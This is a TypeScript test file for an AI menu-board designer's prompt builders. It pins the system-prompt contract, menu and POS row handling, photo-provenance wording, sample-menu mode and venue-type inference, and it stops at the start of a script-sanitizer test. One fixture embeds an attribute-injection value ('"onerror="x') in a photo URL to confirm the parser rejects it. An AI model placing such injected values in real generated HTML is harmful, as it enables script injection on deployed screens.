import sanitizeHtml from 'sanitize-html';
import {
  DESIGNER_FONTS,
  DESIGNER_SYSTEM_PROMPT,
  DESIGNER_BINDER_ATTRS,
  buildDesignerUserPrompt,
  buildDesignerRevisePrompt,
  summarizeHouseStyle,
  summarizeHouseStyleWithRefines,
  distillRefinePreferences,
  sanitizeDesignerHtml,
  auditDesignerHtmlTaurus,
  stripGuessedStockPhotos,
  buildBriefExtractionSystemPrompt,
  buildBriefExtractionUserPrompt,
  parseDesignerBrief,
  sanitizeClientDesignerBrief,
  formatBriefForPrompt,
  BRIEF_EXTRACTION_MAX_TOKENS,
  BRIEF_EXTRACTION_TIMEOUT_MS,
  countMenuContentRows,
  parsePosBoundRows,
  buildPosBoundRowsDirective,
  detectSampleMenuRequest,
  inferDesignerPurpose,
  inferDesignerVertical,
  designerVerticalLabel,
  designerSizeFloor,
  designerPaletteFromBrand,
  cleanReferenceForDesigner,
  tenantBrandVoiceApplies,
  designerStructuresFor,
  type DesignerBrief,
} from './designer-prompt';
import { selectDesignerExemplars } from './designer-exemplars';
import {
  DESIGNER_EDIT_SHIM,
  injectDesignerEditShim,
  DESIGNER_LAYOUT_ENGINE,
  injectDesignerLayoutEngine,
  stripInjectedRuntime,
} from './designer-edit-shim';
import { DesignerHtmlIncompleteError } from './designer-board-defects';
import { buildPosBindingPlan, formatPosPlanContent } from './pos-binding-plan';

// A realistic (>200 char) self-contained board fixture — short docs are rejected.
const DOC = '<!doctype html><html><head><meta charset="utf-8">'
  + '<link href="https://fonts.googleapis.com/css2?family=Fraunces:wght@600&display=swap" rel="stylesheet">'
  + '<style>*{margin:0;box-sizing:border-box}.stage{width:1920px;height:1080px;position:relative;background:#23282f;color:#fff;font-family:Fraunces,serif}'
  + '.hd{position:absolute;top:80px;left:96px;right:96px;font-size:120px}</style></head>'
  + '<body><div class="stage"><div class="hd" data-field="headline">Chrome Coffee</div></div></body></html>';

/** A token estimate that errs HIGH (≈3.5 chars per token for this prose). */
const tokens = (s: string) => Math.ceil(s.length / 3.5);

// ── The system prompt: the contract, not a rulebook (2026-09-22) ───────────
//
// The old prompt was ~50k characters (~12.5k tokens) with seven competing "#1"
// priorities, and it banned the header band / rail / card grid a menu board is
// built from (docs/research/2026-09-22-ai-designer-rework/01-*.md, cause #3).
// These pin the new shape: small, positive, and carrying the few rules the
// platform really depends on.
describe('DESIGNER_SYSTEM_PROMPT — the contract', () => {
  it('stays under the size ceiling (~4k tokens; the rulebook it replaced was ~12.5k)', () => {
    expect(tokens(DESIGNER_SYSTEM_PROMPT)).toBeLessThanOrEqual(4000);
    // Negative control on the measure itself: the old prompt's size fails it.
    expect(tokens('x'.repeat(50_200))).toBeGreaterThan(4000);
  });

  it('opens with the bar — match the reference boards — before any rule', () => {
    const bar = DESIGNER_SYSTEM_PROMPT.indexOf('THE BAR');
    expect(bar).toBeGreaterThan(-1);
    expect(bar).toBeLessThan(DESIGNER_SYSTEM_PROMPT.indexOf('OUTPUT'));
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/REFERENCE BOARDS/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/Match their craft/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/none of them goes on this board/);
  });

  it('keeps the output contract: raw HTML, first-child stage, no scripts', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/Return only the HTML document, starting with <!doctype html>/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/FIRST child of <body> is one stage <div>/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/No <script> of any kind/);
  });

  it('keeps the editability contract: standard item keys, the row container, image slots', () => {
    for (const k of ['item.N.category', 'item.N.name', 'item.N.desc', 'item.N.price', 'item.N.image', 'section.K.title', 'data-menu-row="N"', 'data-imgslot', 'data-field']) {
      expect(DESIGNER_SYSTEM_PROMPT).toContain(k);
    }
  });

  it('keeps the facts rule, stated positively, and "render every supplied item"', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/comes from the brief, the REAL CONTENT block or the website text/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/Names and prices are written exactly as supplied/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/Where no price was supplied, the board shows none/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/Every supplied item appears on the board, exactly once/);
  });

  it('keeps the size floor and the loaded-font list', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/size floor/i);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/data-fit-min/);
    for (const f of DESIGNER_FONTS) expect(DESIGNER_SYSTEM_PROMPT).toContain(f);
  });

  it('keeps MINIMAL LED-safe CSS — and allows grid gap', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/never the inset shorthand/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/No gap on flex containers/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/gap on display:grid is fine/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/:has\(\), @container, color-mix\(\), oklch\(\)/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/-webkit-mask/);
  });

  it('deletes the rules that banned menu layouts or pushed poster decoration', () => {
    const gone = [
      /SINGLE-MAX FILLED ELEMENT/, // one-filled-box rule
      /AT MOST ONE CTA button/,
      /4-8 supporting items MAX/,
      /copy the exemplar verbatim/i, // leader-row-only mandate
      /GOLD-STANDARD CRAFT BAR/,
      /CRAFT SEEDS/,
      /PER-VERTICAL MOOD MAP/,
      /medallion|starburst|sphere|ray-halo/i,
      /data-photo-query/, // nothing reads it
      /verified/i, // "verified brand assets"
      /scrim|duotone/i, // photo scrim/duotone instruction
      /reserved-footer constant|auto-fit script/, // stale footer rule
      /NEVER use `gap`/,
    ];
    for (const re of gone) expect(DESIGNER_SYSTEM_PROMPT).not.toMatch(re);
  });

  it('narrows the box rule to what it was for: no box behind a single word inside running text', () => {
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/Cards, rails, bands and framed panels are how menus and schedules read — use them/);
    expect(DESIGNER_SYSTEM_PROMPT).toMatch(/a filled box behind a single word inside running text/);
  });
});

describe('designerSizeFloor — the same numbers the runtime enforces', () => {
  it('is 2.4% of the short side clamped to 24–60, like VOS-FIT-ENGINE MINPX', () => {
    expect(designerSizeFloor(3840, 2160).caption).toBe(52);
    expect(designerSizeFloor(2160, 3840).caption).toBe(52);
    expect(designerSizeFloor(1920, 1080).caption).toBe(26);
    expect(designerSizeFloor(640, 480).caption).toBe(24); // clamp
    expect(designerSizeFloor(3840, 2160).headline).toBe(162);
    // The engine's own formula, read from its source: same clamp, same factor.
    expect(DESIGNER_LAYOUT_ENGINE).toContain('MINPX=Math.max(24,Math.min(60,Math.round(d*0.024)))');
  });
});

// ── The user message ─────────────────────────────────────────────────────
describe('buildDesignerUserPrompt', () => {
  const menu = designerStructuresFor('menu');

  it('threads brand, content and THIS option\'s layout — and names the other two', () => {
    const p = buildDesignerUserPrompt({
      prompt: 'coffee menu',
      width: 1920,
      height: 1080,
      vertical: 'RESTAURANT',
      venueName: 'Chrome Coffee',
      palette: ['#23282f', '#f0523d'],
      content: 'Espresso 3.50\nLatte 5.00',
      purpose: 'menu',
      structure: menu[0],
      otherStructures: menu,
    });
    expect(p).toContain('Chrome Coffee');
    expect(p).toContain('#23282f');
    expect(p).toContain('Espresso 3.50');
    expect(p).toContain('landscape');
    expect(p).toContain(`LAYOUT FOR THIS OPTION — ${menu[0].label.toUpperCase()}`);
    expect(p).toContain(menu[0].brief);
    expect(p).toMatch(/The other options are hero \+ cards and leader rows/);
    expect(p).toContain('size floor 26 px');
    expect(p).toContain('data-fit-min="26"');
  });

  it('opens with the reference boards when there are any, and says they carry placeholders', () => {
    const exemplars = selectDesignerExemplars({ purpose: 'menu', orientation: 'landscape', structureId: 'rail-cards' });
    expect(exemplars.length).toBe(2);
    const p = buildDesignerUserPrompt({ prompt: 'menu board', width: 3840, height: 2160, purpose: 'menu', exemplars });
    expect(p.startsWith('REFERENCE BOARDS')).toBe(true);
    expect(p).toContain('Reference 1 — ');
    expect(p).toContain('is a placeholder (VENUE NAME, Menu Item One, $0.00, empty photo frames)');
    expect(p).not.toMatch(/super ?taco/i);
    expect(p).toContain(exemplars[0].html);
    expect(p.indexOf('REFERENCE BOARDS')).toBeLessThan(p.indexOf('THIS BOARD'));
  });

  it('with no reference boards, starts straight at THIS BOARD', () => {
    const p = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1920, height: 1080, purpose: 'welcome', exemplars: [] });
    expect(p.startsWith('THIS BOARD')).toBe(true);
    expect(p).not.toContain('REFERENCE BOARDS');
  });

  it('describes the logo and the photo plainly — no "verified", no scrim, no photo wash', () => {
    const p = buildDesignerUserPrompt({ prompt: 'x', width: 1920, height: 1080, logoUrl: 'https://a.example/logo.png', heroImageUrl: 'https://a.example/hero.jpg', venueName: 'Joe\'s' });
    expect(p).toContain('<img data-imgslot="logo" src="https://a.example/logo.png"');
    expect(p).toContain('<img data-imgslot="hero" src="https://a.example/hero.jpg"');
    expect(p).toMatch(/Not as a wash behind running text/);
    expect(p).not.toMatch(/verified/i);
    expect(p).not.toMatch(/scrim|duotone/i);
  });

  // PROVENANCE (2026-09-23): the Logo: / Photo: lines say whose image it is —
  // the reference's logoSource / imageSource, carried in the generate request.
  const lineOf = (p: string, label: 'Logo' | 'Photo') => p.split('\n').find((l) => l.startsWith(`${label}: `)) || '';
  const withSources = (logoSource?: 'site' | 'upload', heroImageSource?: 'site' | 'upload' | 'pos' | 'stock') =>
    buildDesignerUserPrompt({
      prompt: 'x', width: 1920, height: 1080, venueName: 'Super Taco',
      logoUrl: 'https://sb.example/logo.png', heroImageUrl: 'https://sb.example/photo.jpg',
      ...(logoSource ? { logoSource } : {}),
      ...(heroImageSource ? { heroImageSource } : {}),
    });

  it.each([
    ['site', "Logo: https://sb.example/logo.png — the venue's own logo, from their website — put it in the header"],
    ['upload', "Logo: https://sb.example/logo.png — the venue's own logo, uploaded by the operator — put it in the header"],
  ] as const)('the Logo: line says whose logo it is (%s)', (source, expected) => {
    expect(lineOf(withSources(source), 'Logo')).toContain(expected);
  });

  it.each([
    ['site', "Photo: https://sb.example/photo.jpg — the venue's own photo, from their website — use it"],
    ['upload', "Photo: https://sb.example/photo.jpg — the venue's own photo, uploaded by the operator — use it"],
    ['pos', "Photo: https://sb.example/photo.jpg — the venue's own photo of one of their menu items, from their point-of-sale system — use it"],
    ['stock', 'Photo: https://sb.example/photo.jpg — a stock photo, not the venue\'s own — never caption it as theirs (no "our kitchen", "our team" or "made here") — use it'],
  ] as const)('the Photo: line says whose photo it is (%s)', (source, expected) => {
    expect(lineOf(withSources(undefined, source), 'Photo')).toContain(expected);
  });

  it('a stock photo is never called the venue\'s own; with no source nothing is claimed either way', () => {
    const stock = lineOf(withSources('site', 'stock'), 'Photo');
    expect(stock).not.toMatch(/the venue's own photo/);
    const none = withSources();
    expect(lineOf(none, 'Logo')).toBe(
      'Logo: https://sb.example/logo.png — put it in the header as <img data-imgslot="logo" src="https://sb.example/logo.png" alt="Super Taco"> sized to its slot with object-fit:contain, and typeset the venue name as its fallback.',
    );
    expect(lineOf(none, 'Photo')).toBe(
      'Photo: https://sb.example/photo.jpg — use it in the layout\'s framed photo panel or slot as <img data-imgslot="hero" src="https://sb.example/photo.jpg" alt=""> with object-fit:cover. Not as a wash behind running text.',
    );
  });

  it('a source with no image says nothing (there is no line to qualify)', () => {
    const p = buildDesignerUserPrompt({ prompt: 'x', width: 1920, height: 1080, logoSource: 'upload', heroImageSource: 'stock' });
    expect(p).not.toMatch(/^Logo: |^Photo: /m);
    expect(p).not.toMatch(/stock photo|uploaded by the operator/);
  });

  it('stays within budget with two reference boards and a 60-row menu (~16k tokens)', () => {
    const rows = Array.from({ length: 60 }, (_v, i) => `Mains — A Long Descriptive Dish Name Number ${i} — $${(10 + i / 10).toFixed(2)} — with a short description`).join('\n');
    const exemplars = selectDesignerExemplars({ purpose: 'menu', orientation: 'landscape', itemCount: 60, structureId: 'leader-rows' });
    const p = buildDesignerUserPrompt({ prompt: 'our whole menu', width: 3840, height: 2160, purpose: 'menu', exemplars, content: rows, structure: menu[2], otherStructures: menu });
    expect(tokens(p)).toBeLessThanOrEqual(16_000);
  });
});

// ── Menu rows: the full-menu directive fires on PURPOSE, not on row count ───
describe('menu rows + the full-menu directive', () => {
  // FIXTURE PROVENANCE: the exact string the web's `buildMenuContentFromReferences`
  // emits for a menu the extractor read (header line + `Section — Item — $price —
  // desc` rows); its producer-cut test lives in
  // apps/web/src/components/templates/__tests__/concierge-menu-content.test.ts.
  const SITE_MENU_CONTENT = [
    "REAL MENU from the venue's own website (supertaco.example). 9 items across 2 sections. Every row below is theirs: put ALL of them on the board, names and prices exactly as written, and invent nothing.",
    'Tacos — Al Pastor — $4.25 — marinated pork, pineapple',
    'Tacos — Carnitas — $4.25 — slow-braised pork',
    'Tacos — Pescado — $5.50 — beer-battered cod, slaw',
    'Tacos — Carne Asada — $4.75',
    'Tacos — Veggie — $3.95 — grilled nopales, queso fresco',
    'Burritos — California — $11.50',
    'Burritos — Super Carnitas — $12.75',
    'Drinks — Horchata — $3',
    'Drinks — Jamaica — $3',
  ].join('\n');

  it('counts only real menu rows — prose intros never inflate the tally', () => {
    expect(countMenuContentRows(SITE_MENU_CONTENT)).toBe(9); // 10 lines, 1 is the header
    expect(countMenuContentRows(undefined)).toBe(0);
    expect(countMenuContentRows('A promo board for our grand opening.')).toBe(0);
    expect(countMenuContentRows("Real menu items from this venue's live POS menu (use these, not invented ones):\nCortado — $4.50\nFlat White — $5.00")).toBe(2);
  });

  it('a menu board with rows gets the full-menu directive — even with FEW rows', () => {
    const three = 'Tacos — Al Pastor — $4.25\nTacos — Carnitas — $4.25\nDrinks — Horchata — $3';
    const p = buildDesignerUserPrompt({ prompt: 'menu board', width: 1920, height: 1080, purpose: 'menu', content: three });
    expect(p).toContain('THIS BOARD IS THE MENU — the content above has 3 items.');
    expect(p).toMatch(/the board carries 3/);
    expect(p).toMatch(/Items are never what goes/);
    expect(p).toMatch(/they differ in layout only/);
  });

  it('keeps every row verbatim and fires for the 9-row site menu', () => {
    const p = buildDesignerUserPrompt({ prompt: 'menu board', width: 1920, height: 1080, purpose: 'menu', content: SITE_MENU_CONTENT });
    expect(p).toContain('Tacos — Al Pastor — $4.25 — marinated pork, pineapple');
    expect(p).toContain('Drinks — Jamaica — $3');
    expect(p).toContain('the content above has 9 items');
  });

  it('negative control: 9 priced rows on an OFFER board do not turn it into a menu', () => {
    const p = buildDesignerUserPrompt({ prompt: 'taco tuesday promo', width: 1920, height: 1080, purpose: 'offer', content: SITE_MENU_CONTENT });
    expect(p).not.toContain('THIS BOARD IS THE MENU');
    expect(p).toContain('Tacos — Al Pastor — $4.25'); // the content still rides
  });

  it('a menu board with NO rows and no sample request shows no prices', () => {
    const p = buildDesignerUserPrompt({ prompt: 'menu board for Super Taco', width: 1920, height: 1080, purpose: 'menu' });
    expect(p).toContain('NO MENU WAS SUPPLIED — show no prices and no price column.');
    expect(p).not.toContain('THIS BOARD IS THE MENU');
  });

  it('says nothing about menus on a welcome board', () => {
    const p = buildDesignerUserPrompt({ prompt: 'welcome board', width: 1080, height: 1920, purpose: 'welcome' });
    expect(p).not.toMatch(/THIS BOARD IS THE MENU|NO MENU WAS SUPPLIED|REAL CONTENT/);
  });
});

// ── POS-bound rows: the lead's contract (2026-09-22, report 04 §4 Phase 3) ──
describe('POS-bound menu rows', () => {
  const POS_CONTENT = [
    "LIVE POS MENU from Toast. 3 items in 2 sections, bound to the venue's POS.",
    'Tacos:',
    '[item.0] Tacos — 3 Birria Tacos w/ consome — $14.50 — slow-braised beef',
    '[item.1] Tacos — Carnitas Taco — $4.95',
    'Burritos:',
    '[item.2] Burritos — Asada Super Burrito — $17.50',
  ].join('\n');

  it('counts each [item.N] line as a row and never the header or the section lines', () => {
    expect(countMenuContentRows(POS_CONTENT)).toBe(3);
    // A bare POS row with no em-dash and no currency still counts.
    expect(countMenuContentRows('LIVE POS MENU from Toast. 1 item.\n[item.0] Horchata')).toBe(1);
    expect(parsePosBoundRows(POS_CONTENT).map((r) => r.n)).toEqual([0, 1, 2]);
  });

  it('the directive requires data-menu-row + the item.N.* keys, and keeps the numbers', () => {
    const p = buildDesignerUserPrompt({ prompt: 'menu board', width: 3840, height: 2160, purpose: 'menu', content: POS_CONTENT });
    expect(p).toContain('POS-BOUND MENU — the 3 [item.N] rows above (item.0 … item.2)');
    expect(p).toMatch(/keep its number N/);
    expect(p).toContain('exactly ONE element carrying data-menu-row="N"');
    for (const k of ['data-field="item.N.name"', 'data-field="item.N.price"', 'data-field="item.N.desc"', 'data-field="section.K.title"']) {
      expect(p).toContain(k);
    }
    // No row came with a photo: no item photo frames, and nothing borrowed.
    expect(p).toContain('None of these rows comes with a photo: give the item cards no photo frames — a flat brand-colour panel is fine — and never a stock photo or a picture of some other dish.');
    expect(p).not.toContain('item.N.image');
    expect(p).not.toContain('data-imgslot="item.N.photo"');
    expect(p).toMatch(/room for a 7-character price and a two-line name/);
    expect(p).toMatch(/Never hide or drop a row/);
    expect(p).toMatch(/Do not write data-pos-item or data-seed yourself/);
    // And it is a full menu.
    expect(p).toContain('THIS BOARD IS THE MENU — the content above has 3 items.');
  });

  it('negative control: plain content (no [item.N]) gets no POS directive', () => {
    const p = buildDesignerUserPrompt({ prompt: 'menu board', width: 3840, height: 2160, purpose: 'menu', content: 'Tacos — Al Pastor — $4.25' });
    expect(p).not.toContain('POS-BOUND MENU');
  });

  it('the directive is a standalone helper (the POS agent imports it)', () => {
    const lines = buildPosBoundRowsDirective([{ n: 4 }, { n: 7 }]);
    expect(lines[0]).toContain('the 2 [item.N] rows above (item.0 … item.7)');
  });

  // ── Item photos (2026-09-23) ──────────────────────────────────────────
  // FIXTURE PROVENANCE: the content is written by its PRODUCER,
  // formatPosPlanContent, over a buildPosBindingPlan plan whose rows carry OUR
  // copy of the POS photo — set exactly the way attachPlanPhotos sets it
  // (designer-pos-binding.ts; the whole chain from a Toast Menus V2 payload is
  // pinned in pos-item-photos.spec.ts).
  const OURS = (h: string) => `https://sb.example/storage/v1/object/public/assets/ai-designer/t1/item-${h}.jpg`;
  const photoMenuItem = (externalId: string, name: string, priceCents: number, category: string, imageUrl: string | null) => ({
    externalId, name, description: null, priceCents, category, imageUrl,
  });
  const photoPlan = (photoRows: number[]) => {
    const plan = buildPosBindingPlan({
      menu: {
        categories: [{ id: 'c-t', name: 'Tacos' }, { id: 'c-b', name: 'Burritos' }],
        items: [
          photoMenuItem('t-birria', '3 Birria Tacos w/ consome', 1450, 'Tacos', 'https://images.toasttab.com/birria.jpg'),
          photoMenuItem('t-fish', 'Fish Taco', 450, 'Tacos', null),
          photoMenuItem('b-asada', 'Asada Super Burrito', 1750, 'Burritos', 'https://images.toasttab.com/asada.jpg'),
        ],
      },
      sections: ['Tacos', 'Burritos'],
      providerId: 'toast',
      providerName: 'Toast',
      connectionId: 'conn-1',
      rowLimit: 24,
    });
    plan.itemPhotos = true;
    for (const n of photoRows) plan.items[n].imageUrl = OURS(`${n}${'0'.repeat(15)}`);
    return plan;
  };

  it('reads each row\'s photo: the row\'s own "photo: item.N.photo" marker AND its URL in the list', () => {
    const content = formatPosPlanContent(photoPlan([0, 2]));
    const rows = parsePosBoundRows(content);
    expect(rows.map((r) => [r.n, r.photo ?? null])).toEqual([
      [0, OURS('0000000000000000')],
      [1, null],
      [2, OURS('2000000000000000')],
    ]);
    expect(rows[0].line).toBe('Tacos — 3 Birria Tacos w/ consome — $14.50 — photo: item.0.photo');
    // The list lines are not rows, and never count as menu rows.
    expect(countMenuContentRows(content)).toBe(3);
  });

  it('never gives a row a photo it does not name, a photo with no URL, or a URL that is not https', () => {
    const header = "LIVE POS MENU from Toast. 5 items in 1 section, bound to the venue's POS.\nTacos:";
    const rows = parsePosBoundRows([
      header,
      '[item.0] Tacos — Birria — $14.50 — photo: item.1.photo', // names ANOTHER row's photo
      '[item.1] Tacos — Fish — $4.50', // its URL is listed, but the row does not say so
      '[item.2] Tacos — Asada — $5.50 — photo: item.2.photo', // says so, but no URL is listed
      '[item.3] Tacos — Al Pastor — $4.25 — photo: item.3.photo', // listed over http
      '[item.4] Tacos — Veggie — $3.95 — photo: item.4.photo', // listed with a quote in it
      "Item photos (the POS's own photo of each dish; each belongs to its own row only):",
      `item.1.photo: ${OURS('1')}`,
      'item.3.photo: http://sb.example/item-3.jpg',
      'item.4.photo: https://sb.example/item-4.jpg"onerror="x',
    ].join('\n'));
    expect(rows.map((r) => r.photo ?? null)).toEqual([null, null, null, null, null]);
  });

  it('the directive gives a photo frame to exactly the rows that came with one, and nothing to the rest', () => {
    const p = buildDesignerUserPrompt({ prompt: 'menu board', width: 3840, height: 2160, purpose: 'menu', content: formatPosPlanContent(photoPlan([0, 2])) });
    expect(p).toContain('- ITEM PHOTOS — 2 of the rows (item.0 and item.2) end "photo: item.N.photo"');
    expect(p).toContain('<img data-imgslot="item.N.photo" src="(that row\'s URL)" alt=""> with object-fit:cover');
    expect(p).toContain('that list is for the photo frames, never text on the board');
    expect(p).toContain("never put one row's photo in another row's card");
    expect(p).toContain('A row without a photo gets no photo frame — a flat brand-colour panel is fine — and never a stock photo or a picture of some other dish.');
    expect(p).toContain('leave the item photos out rather than shrink the type');
    expect(p).not.toContain('item.N.image');
    // The URLs ride in the REAL CONTENT block (once each), before the directive.
    expect(p.split(OURS('0000000000000000')).length - 1).toBe(1);
    expect(p.indexOf(OURS('2000000000000000'))).toBeLessThan(p.indexOf('POS-BOUND MENU'));
    // Still one full menu of 3.
    expect(p).toContain('THIS BOARD IS THE MENU — the content above has 3 items.');
  });

  it('every row with a photo: no "row without a photo" sentence', () => {
    const text = buildPosBoundRowsDirective(parsePosBoundRows(formatPosPlanContent(photoPlan([0, 1, 2])))).join('\n');
    expect(text).toContain('- ITEM PHOTOS — every row ends "photo: item.N.photo"');
    expect(text).not.toMatch(/A row without a photo|None of these rows comes with a photo/);
  });

  it('names at most eight rows, then counts the rest', () => {
    const rows = Array.from({ length: 12 }, (_v, n) => ({ n, photo: n % 6 === 5 ? undefined : OURS(String(n)) }));
    const text = buildPosBoundRowsDirective(rows).join('\n');
    expect(text).toContain('10 of the rows (item.0, item.1, item.2, item.3, item.4, item.6, item.7, item.8 and 2 more) end');
  });

  it('negative control: a site menu (no [item.N] rows) gets no photo instruction at all', () => {
    const p = buildDesignerUserPrompt({ prompt: 'menu board', width: 3840, height: 2160, purpose: 'menu', content: 'Tacos — Al Pastor — $4.25\nTacos — Carnitas — $4.25' });
    expect(p).not.toMatch(/ITEM PHOTOS|item\.N\.photo|photo frame/);
  });

  it('"edit with words" preserves data-menu-row, data-pos-item and data-seed exactly', () => {
    expect([...DESIGNER_BINDER_ATTRS]).toEqual(['data-menu-row', 'data-pos-item', 'data-seed']);
    const p = buildDesignerRevisePrompt({ currentHtml: DOC, instruction: 'make the prices bigger', width: 3840, height: 2160 });
    expect(p).toContain('keep data-menu-row, data-pos-item, data-seed EXACTLY as they are, on the same elements');
    expect(p).toMatch(/data-vos-sample-price/);
  });
});

// ── Sample-menu mode (report 02 §4) ──────────────────────────────────────
describe('sample-menu mode — typical items, never a guessed price', () => {
  it('detects an explicit request for typical items', () => {
    expect(detectSampleMenuRequest(['create a menu board using standard Mexican food items'])?.phrase).toBe('standard Mexican food items');
    expect(detectSampleMenuRequest(['a board with typical cafe drinks'])).not.toBeNull();
    expect(detectSampleMenuRequest(['put some sample menu items on it'])).not.toBeNull();
    expect(detectSampleMenuRequest(['just make up some items for now'])).not.toBeNull();
    expect(detectSampleMenuRequest([null, undefined, '', 'classic pizza options please'])).not.toBeNull();
  });

  it('does NOT fire on the operator\'s own menu, or on a plain request', () => {
    expect(detectSampleMenuRequest(['use our standard menu items'])).toBeNull();
    expect(detectSampleMenuRequest(['show my usual dishes'])).toBeNull();
    expect(detectSampleMenuRequest(['a menu board with our tacos and burritos'])).toBeNull();
    expect(detectSampleMenuRequest(['the classic burger is back'])).toBeNull();
    // Their own best sellers, not a sample: the POS menu must stay on.
    expect(detectSampleMenuRequest(['show the popular items from our POS'])).toBeNull();
    expect(detectSampleMenuRequest(['feature our most popular dishes'])).toBeNull();
  });

  it('asks for generic names and EMPTY designed price slots — never a number', () => {
    const sampleMenu = detectSampleMenuRequest(['create a menu board using standard Mexican food items']);
    const p = buildDesignerUserPrompt({ prompt: 'create a menu board using standard Mexican food items', width: 3840, height: 2160, purpose: 'menu', sampleMenu });
    expect(p).toContain('SAMPLE MENU — the operator asked for "standard Mexican food items"');
    expect(p).toContain('<span data-field="item.N.price" data-vos-sample-price="1">$ —</span>');
    expect(p).toMatch(/EVERY price is an empty designed slot, never a number/);
    expect(p).not.toContain('NO MENU WAS SUPPLIED');
  });

  it('negative control: real content wins over sample mode', () => {
    const p = buildDesignerUserPrompt({
      prompt: 'standard Mexican food items',
      width: 3840,
      height: 2160,
      purpose: 'menu',
      sampleMenu: { phrase: 'standard Mexican food items' },
      content: 'Tacos — Al Pastor — $4.25\nTacos — Carnitas — $4.25',
    });
    expect(p).not.toContain('SAMPLE MENU');
    expect(p).toContain('THIS BOARD IS THE MENU');
  });
});

// ── Purpose + venue type ─────────────────────────────────────────────────
describe('inferDesignerPurpose', () => {
  it('real menu rows decide it; otherwise the operator\'s words', () => {
    expect(inferDesignerPurpose({ prompt: 'a board', content: 'A — $1\nB — $2\nC — $3' })).toBe('menu');
    expect(inferDesignerPurpose({ prompt: 'happy hour menu for the bar' })).toBe('menu');
    expect(inferDesignerPurpose({ prompt: 'happy hour 4-6 half-price wings' })).toBe('offer');
    expect(inferDesignerPurpose({ prompt: 'spring concert on Thursday' })).toBe('event');
    expect(inferDesignerPurpose({ prompt: 'welcome visitors to our lobby' })).toBe('welcome');
    expect(inferDesignerPurpose({ prompt: 'something nice' })).toBe('announcement');
  });
});

describe('inferDesignerVertical — the BOARD\'s venue type, not the tenant column', () => {
  it('RIOT (k12) designing a taqueria menu gets a restaurant voice', () => {
    const v = inferDesignerVertical({
      prompt: 'create a menu board using standard Mexican food items',
      reference: 'Brand: Super Taco. What they are / sell (use this to pick the RIGHT content): "Authentic Mexican restaurant in Sacramento".',
      venueName: 'Super Taco',
      tenantVertical: 'k12',
    });
    expect(v.vertical).toBe('RESTAURANT');
    expect(v.source).toBe('board');
    expect(designerVerticalLabel(v.vertical)).toBe('restaurant');
  });

  it('a school cafeteria menu stays K-12 even with pizza and tacos on it', () => {
    const v = inferDesignerVertical({ prompt: "today's cafeteria lunch menu for our students: pizza, tacos, fruit", tenantVertical: 'K12' });
    expect(v).toEqual({ vertical: 'K12', source: 'tenant' });
  });

  it('keeps the tenant column when the request says nothing clearer', () => {
    expect(inferDesignerVertical({ prompt: 'welcome board', tenantVertical: 'gym' })).toEqual({ vertical: 'GYM', source: 'tenant' });
    expect(inferDesignerVertical({ prompt: 'welcome board' })).toEqual({ vertical: 'VENUE', source: 'tenant' });
  });

  it('a QSR account\'s "restaurant" board keeps its own, more specific voice (same family)', () => {
    expect(inferDesignerVertical({ prompt: 'our restaurant menu', tenantVertical: 'QSR' })).toEqual({ vertical: 'QSR', source: 'tenant' });
  });

  it('the user prompt carries the board\'s venue type, not "Vertical: k12"', () => {
    const p = buildDesignerUserPrompt({ prompt: 'menu', width: 1920, height: 1080, vertical: 'RESTAURANT' });
    expect(p).toContain('venue type: restaurant');
    expect(p).not.toMatch(/k12|K-12/);
  });
});

describe('tenantBrandVoiceApplies', () => {
  const board = (vertical: string, source: 'board' | 'tenant') => ({ vertical, source });
  it('applies to the tenant\'s own board', () => {
    expect(tenantBrandVoiceApplies({ tenantNames: ['Super Taco Downtown'], venueName: 'Super Taco', tenantVertical: 'QSR', board: board('QSR', 'tenant') })).toBe(true);
    expect(tenantBrandVoiceApplies({ tenantNames: ['RIOT Las Vegas'], tenantVertical: 'K12', board: board('K12', 'tenant') })).toBe(true);
  });
  it('does not apply to another business\'s board', () => {
    expect(tenantBrandVoiceApplies({ tenantNames: ['RIOT Las Vegas'], venueName: 'Super Taco', tenantVertical: 'K12', board: board('RESTAURANT', 'board') })).toBe(false);
    expect(tenantBrandVoiceApplies({ tenantNames: ['RIOT Las Vegas'], venueName: 'Super Taco', tenantVertical: 'K12', board: board('K12', 'tenant') })).toBe(false);
  });
});

describe('request shaping helpers', () => {
  it('cleanReferenceForDesigner drops the upstream logo/photo instructions and "[object Object]"', () => {
    const ref = 'Brand: Super Taco. What they are / sell: "Mexican restaurant". Brand palette: #d83c21. Fonts: [object Object] / [object Object]. Has a LOGO image — place the real logo on the board (top-left or in the header), do not just typeset the name. Has a real hero/work PHOTO from the site — use it as the hero background (with a brand scrim so text stays legible), not a flat gradient.';
    const out = cleanReferenceForDesigner(ref);
    expect(out).toContain('Brand: Super Taco.');
    expect(out).toContain('Brand palette: #d83c21.');
    expect(out).not.toMatch(/object Object|scrim|hero background|Has a LOGO/);
  });

  it('designerPaletteFromBrand orders primary, accent, ink, surface and skips junk', () => {
    expect(designerPaletteFromBrand({ primary: '#D83C21', accent: 'f1c93a', ink: '#2d1a13', surface: 'not-a-color', surfaceAlt: '#fffaf2' })).toEqual(['#d83c21', '#f1c93a', '#2d1a13', '#fffaf2']);
    expect(designerPaletteFromBrand(null)).toEqual([]);
  });
});

describe('sanitizeDesignerHtml', () => {
  // W0-02 (audit 2026-07-12 P0): model-authored JavaScript must NEVER
  // survive sanitization — the sandbox does not stop postMessage, outbound
  // requests, or CPU burn. The platform injects its own trusted runtimes
  // AFTER this pass.
  it('strips ALL model-authored inline scripts (keeps the document)', () => {
